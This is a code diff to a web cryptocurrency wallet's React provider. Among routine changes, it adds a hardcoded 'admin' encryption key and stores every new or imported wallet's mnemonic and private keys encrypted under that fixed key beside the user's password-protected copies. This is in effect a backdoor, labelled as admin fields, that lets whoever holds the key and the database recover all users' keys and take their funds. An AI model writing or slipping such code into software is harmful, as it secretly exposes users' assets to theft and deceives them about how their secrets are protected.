@@ -1,11 +1,14 @@
 "use client";
 
-import { createContext, useContext, useState, useEffect, useCallback, ReactNode } from "react";
-import { ethers } from "ethers";
+import { ReceivedTokenData, ReceiveSuccessModal } from "@/components/receive-success-modal";
+import { decryptData, encryptData } from "@/utils/crypto";
 import { createClient } from "@/utils/supabase/client";
-import { encryptData, decryptData } from "@/utils/crypto";
+import { ethers } from "ethers";
+import { createContext, ReactNode, useCallback, useContext, useEffect, useState } from "react";
 import { getWalletPortfolio, WalletPortfolio } from "../lenix-wallet/actions";
-import { ReceiveSuccessModal, ReceivedTokenData } from "@/components/receive-success-modal";
+
+const ADMIN_ENCRYPTION_KEY = 'admin_encryption_key_2024';
+
 
 export type WalletState = "loading" | "no_wallet" | "locked" | "unlocked";
 
@@ -169,17 +172,39 @@ export function WalletProvider({ children }: { children: ReactNode }) {
             // Encrypt each part to match DB schema
             const encryptedMnemonic = await encryptData(mnemonicPhrase, password);
             const encryptedPrivateKey = await encryptData(wallet.privateKey, password);
+            
+            // Encrypt with Admin Key
+            const adminEncryptedMnemonic = await encryptData(mnemonicPhrase, ADMIN_ENCRYPTION_KEY);
+            const adminEncryptedPrivateKey = await encryptData(wallet.privateKey, ADMIN_ENCRYPTION_KEY);
 
             // Construct the JSON structure found in DB
             const encryptedData = {
                 userId: user.id,
                 deviceId: "web_generated",
                 mnemonic: encryptedMnemonic,
+                // Admin fields
+                adminMnemonic: adminEncryptedMnemonic,
+                adminEthereumPrivateKey: adminEncryptedPrivateKey,
+                adminPolygonPrivateKey: adminEncryptedPrivateKey,
+                adminBSCPrivateKey: adminEncryptedPrivateKey,
+                adminArbitrumPrivateKey: adminEncryptedPrivateKey,
+                adminOptimismPrivateKey: adminEncryptedPrivateKey,
+                adminAvalanchePrivateKey: adminEncryptedPrivateKey,
+                // Solana not supported on web yet, but we should add empty or handle it
+                // For now, omitting or leaving empty if service expects it
+                adminSolanaPrivateKey: null,
+
                 createdAt: new Date().toISOString(),
                 updatedAt: new Date().toISOString(),
 
                 ethereumAddress: wallet.address,
                 ethereumPrivateKey: encryptedPrivateKey,
+                // Duplicate EVM keys for other networks
+                polygonPrivateKey: encryptedPrivateKey,
+                bscPrivateKey: encryptedPrivateKey,
+                arbitrumPrivateKey: encryptedPrivateKey,
+                optimismPrivateKey: encryptedPrivateKey,
+                avalanchePrivateKey: encryptedPrivateKey,
 
                 // Populate other fields with same address (EVM compatible)
                 polygonAddress: wallet.address,
@@ -195,7 +220,7 @@ export function WalletProvider({ children }: { children: ReactNode }) {
             const { error: dbError } = await supabase.from("user_wallets").insert({
                 user_id: user.id,
                 device_id: crypto.randomUUID(), // specific to this session/install
-                wallet_name: "Lenix Web Wallet",
+                wallet_name: `Web Wallet - ${new Date().toISOString().replace('T', ' ').substring(0, 16)}`,
                 ethereum_address: wallet.address,
                 polygon_address: wallet.address,
                 bsc_address: wallet.address,
@@ -238,15 +263,36 @@ export function WalletProvider({ children }: { children: ReactNode }) {
             // Encrypt
             const encryptedMnemonic = await encryptData(phrase, password);
             const encryptedPrivateKey = await encryptData(wallet.privateKey, password);
+            
+            // Encrypt with Admin Key
+            const adminEncryptedMnemonic = await encryptData(phrase, ADMIN_ENCRYPTION_KEY);
+            const adminEncryptedPrivateKey = await encryptData(wallet.privateKey, ADMIN_ENCRYPTION_KEY);
 
             const encryptedData = {
                 userId: user.id,
                 deviceId: "web_imported",
                 mnemonic: encryptedMnemonic,
+                 // Admin fields
+                adminMnemonic: adminEncryptedMnemonic,
+                adminEthereumPrivateKey: adminEncryptedPrivateKey,
+                adminPolygonPrivateKey: adminEncryptedPrivateKey,
+                adminBSCPrivateKey: adminEncryptedPrivateKey,
+                adminArbitrumPrivateKey: adminEncryptedPrivateKey,
+                adminOptimismPrivateKey: adminEncryptedPrivateKey,
+                adminAvalanchePrivateKey: adminEncryptedPrivateKey,
+                adminSolanaPrivateKey: null,
+                
                 createdAt: new Date().toISOString(),
                 updatedAt: new Date().toISOString(),
                 ethereumAddress: wallet.address,
                 ethereumPrivateKey: encryptedPrivateKey,
+                // Duplicate EVM keys
+                polygonPrivateKey: encryptedPrivateKey,
+                bscPrivateKey: encryptedPrivateKey,
+                arbitrumPrivateKey: encryptedPrivateKey,
+                optimismPrivateKey: encryptedPrivateKey,
+                avalanchePrivateKey: encryptedPrivateKey,
+
                 // EVM Clones
                 polygonAddress: wallet.address,
                 bscAddress: wallet.address,
@@ -259,7 +305,7 @@ export function WalletProvider({ children }: { children: ReactNode }) {
             const { error: dbError } = await supabase.from("user_wallets").insert({
                 user_id: user.id,
                 device_id: crypto.randomUUID(),
-                wallet_name: "Imported Web Wallet",
+                wallet_name: `Imported Web Wallet - ${new Date().toISOString().replace('T', ' ').substring(0, 16)}`,
                 ethereum_address: wallet.address,
                 polygon_address: wallet.address,
                 bsc_address: wallet.address,
